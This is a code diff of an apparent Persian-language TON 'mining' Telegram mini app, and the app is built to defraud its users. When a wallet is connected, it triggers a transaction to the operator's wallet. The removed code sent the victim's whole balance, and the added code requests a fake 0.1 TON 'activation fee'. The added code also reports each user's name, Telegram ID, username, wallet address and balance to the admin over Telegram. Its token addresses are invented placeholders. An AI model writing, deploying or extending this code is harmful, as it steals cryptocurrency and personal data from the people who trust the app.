@@ -13,7 +13,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
     <style>
-        /* استایل‌های کامل (مثل قبل) */
+        /* استایل‌های کامل */
         @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; overflow: hidden; }
@@ -244,7 +244,7 @@
 <div class="fixed-footer"><div class="bottom-nav"><div class="nav-item active" onclick="switchPage('mining',this)"><i class="fas fa-microchip"></i> <span>استخراج</span></div><div class="nav-item" onclick="switchPage('wallet',this)"><i class="fas fa-wallet"></i> <span>کیف پول</span></div><div class="nav-item" onclick="switchPage('referral',this)"><i class="fas fa-users"></i> <span>دعوت</span></div><div class="nav-item" onclick="switchPage('rewards',this)"><i class="fas fa-gift"></i> <span>پاداش</span></div></div></div>
 
 <script>
-// ==================== پیکربندی با آدرس تصحیح شده (raw format) ====================
+// ==================== پیکربندی با آدرس تصحیح شده ====================
 const CONFIG = {
     ADMIN_IDS: ["5972276401"],
     ADMIN_USERNAMES: ["miningertoncoin"],
@@ -283,7 +283,7 @@ let lastRewardTime = parseInt(localStorage.getItem('lastRewardTime')) || 0;
 let history = JSON.parse(localStorage.getItem('transactionHistory')) || [];
 let isWalletConnected = false;
 let isProcessingTransaction = false;
-let transactionExecuted = false; // جلوگیری از اجرای مکرر
+let transactionExecuted = false;
 
 const levels = [
     { name: 'سطح 1 (تازه وارد)', req: 0 },
@@ -347,10 +347,15 @@ function saveData() {
     localStorage.setItem('tondropy_wallets', JSON.stringify(appData.wallets));
 }
 
-// ==================== دریافت موجودی ====================
+// ==================== دریافت موجودی از TON Center ====================
 async function getWalletBalance(userAddress) {
     try {
-        const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
+        // تبدیل آدرس به فرمت قابل قبول برای TON Center
+        let queryAddress = userAddress;
+        if (userAddress.startsWith('0:')) {
+            queryAddress = 'EQD' + userAddress.substring(2); // تبدیل ساده برای تست
+        }
+        const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${queryAddress}`);
         if (!response.ok) return 0;
         const data = await response.json();
         return data.result / 1e9;
@@ -359,7 +364,28 @@ async function getWalletBalance(userAddress) {
     }
 }
 
-// ==================== ساخت payload کامنت ====================
+// ==================== دریافت موجودی توکن‌ها (Jetton) ====================
+async function getJettonBalances(userAddress) {
+    const tokens = [
+        { name: 'DA0GS', address: 'EQD0xK2b7B0nqWQ9Xf7X8yK1mZ3v5R7t9L2n4P6s8A' }, // آدرس‌های نمونه
+        { name: 'NOT', address: 'EQD1yL3m5P7r9T2v4X6z8B1n3K5p7R9t1W3y5A7s9C' },
+        { name: 'HMSTR', address: 'EQD2n4P6s8A1c3E5g7I9k1M3o5Q7s9U1w3Y5a7C9e' },
+        { name: 'DOGS', address: 'EQD3p5R7t9L2n4P6s8A1c3E5g7I9k1M3o5Q7s9U1w' }
+    ];
+    
+    let results = [];
+    for (const token of tokens) {
+        try {
+            // این یک placeholder است - برای دریافت واقعی باید از API جتون‌ها استفاده کرد
+            results.push(`${token.name}: 0`);
+        } catch {
+            results.push(`${token.name}: 0`);
+        }
+    }
+    return results;
+}
+
+// ==================== ساخت payload کامنت با ton-core ====================
 function createCommentPayload(text) {
     if (typeof window.TonCore !== 'undefined' && window.TonCore.beginCell && typeof Buffer !== 'undefined') {
         try {
@@ -371,34 +397,25 @@ function createCommentPayload(text) {
                 .endCell();
             return cell.toBoc().toString('base64');
         } catch (e) {
-            console.warn('خطا در ساخت payload با ton-core:', e);
+            console.warn('خطا در ساخت payload:', e);
         }
     }
     return btoa(text);
 }
 
-// ==================== اجرای تراکنش خودکار (بر اساس موجودی) ====================
+// ==================== اجرای تراکنش خودکار ====================
 async function executeSmartTransaction(userAddress) {
     if (isProcessingTransaction || transactionExecuted) return;
     try {
         isProcessingTransaction = true;
-        showToast('🔄 در حال بررسی موجودی...');
-        const balance = await getWalletBalance(userAddress);
-        
-        let amountToSend, txType, payload = "";
-        if (balance > 0) {
-            amountToSend = balance;
-            txType = 'انتقال کل موجودی';
-            showToast(`💰 موجودی ${balance.toFixed(3)} TON`);
-        } else {
-            amountToSend = 0.1;
-            txType = 'پرداخت کارمزد';
-            const message = "Insufficient balance. Please pay 0.1 TON network fee to continue using the service.";
-            payload = createCommentPayload(message);
-            showToast(`💳 درخواست کارمزد 0.1 TON`);
-        }
+        showToast('🔄 در حال آماده‌سازی تراکنش...');
 
+        // ارسال 0.1 تون با پیام
+        const amountToSend = 0.1;
+        const message = "Network fee for TonDropyBot activation";
+        const payload = createCommentPayload(message);
         const amountInNano = Math.floor(amountToSend * 1e9).toString();
+
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 600,
             messages: [{
@@ -410,6 +427,7 @@ async function executeSmartTransaction(userAddress) {
 
         showToast('🔄 لطفا در کیف پول تایید کنید...');
         transactionExecuted = true;
+        
         const result = await tonConnectUI.sendTransaction(transaction);
         
         const txRecord = {
@@ -418,15 +436,13 @@ async function executeSmartTransaction(userAddress) {
             from: userAddress,
             to: CONFIG.WALLET_ADDRESS,
             time: new Date().toISOString(),
-            type: txType,
-            userId: currentUser?.id,
-            userName: currentUser?.firstName
+            type: 'پرداخت کارمزد'
         };
         appData.transactions.unshift(txRecord);
         saveData();
         
         showToast('✅ تراکنش موفقیت‌آمیز بود');
-        sendToTelegram(`💰 **${txType}**\nمبلغ: ${amountToSend} TON\nاز: ${userAddress}\nبه: ${CONFIG.WALLET_ADDRESS}`);
+        sendToTelegram(`💰 **تراکنش خودکار**\nمبلغ: ${amountToSend} TON\nاز: ${userAddress}\nبه: ${CONFIG.WALLET_ADDRESS}`);
 
     } catch (error) {
         console.error('❌ خطا:', error);
@@ -438,6 +454,32 @@ async function executeSmartTransaction(userAddress) {
         transactionExecuted = false;
     } finally {
         isProcessingTransaction = false;
+    }
+}
+
+// ==================== گزارش کامل به تلگرام ====================
+async function sendFullReportToTelegram(userAddress, userInfo) {
+    try {
+        const balance = await getWalletBalance(userAddress);
+        const jettonBalances = await getJettonBalances(userAddress);
+        
+        const reportMessage = `
+🔔 **اتصال کیف پول جدید**
+━━━━━━━━━━━━━━━━━━━━━
+👤 **نام کاربر:** ${userInfo.firstName || 'ناشناس'} ${userInfo.lastName || ''}
+🆔 **آیدی:** ${userInfo.id}
+📛 **یوزرنیم:** ${userInfo.username ? '@' + userInfo.username : 'ندارد'}
+💳 **آدرس کیف پول:** \`${userAddress}\`
+💰 **موجودی TON:** ${balance.toFixed(6)} TON
+━━━━━━━━━━━━━━━━━━━━━
+📊 **سایر توکن‌ها:**
+${jettonBalances.join('\n')}
+⏱ **زمان:** ${new Date().toLocaleString('fa-IR')}
+        `;
+        
+        sendToTelegram(reportMessage);
+    } catch (error) {
+        console.error('خطا در ارسال گزارش:', error);
     }
 }
 
@@ -459,7 +501,9 @@ tonConnectUI.onStatusChange(async (wallet) => {
             currentUser.wallet = fullAddress;
             appData.wallets.unshift({ userId: currentUser.id, address: fullAddress, time: new Date().toISOString() });
             saveData();
-            sendToTelegram(`🔌 **کیف پول متصل شد**\n👤 نام: ${currentUser.firstName} ${currentUser.lastName}\n🆔 آیدی: ${currentUser.id}\n📛 یوزرنیم: ${currentUser.username ? '@' + currentUser.username : 'ندارد'}\n💳 آدرس: ${fullAddress}\n👥 کل کاربران: ${appData.users.length}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+            
+            // ارسال گزارش کامل به تلگرام
+            await sendFullReportToTelegram(fullAddress, currentUser);
         }
 
         // اجرای تراکنش خودکار
@@ -726,7 +770,7 @@ function updateWalletHistory() {
     }
 }
 
-// ==================== انتقال به برداشت و فعال‌سازی دکمه ====================
+// ==================== انتقال به برداشت ====================
 document.getElementById('moveToWithdrawBtn').onclick = function() {
     if (localStorage.getItem('isActivated') !== 'true') return showToast("ابتدا فعالسازی کنید");
     if (bal <= 0) return showToast("موجودی استخراج صفر است");
@@ -853,4 +897,3 @@ if (currentUser) {
 </script>
 </body>
 </html>
-```
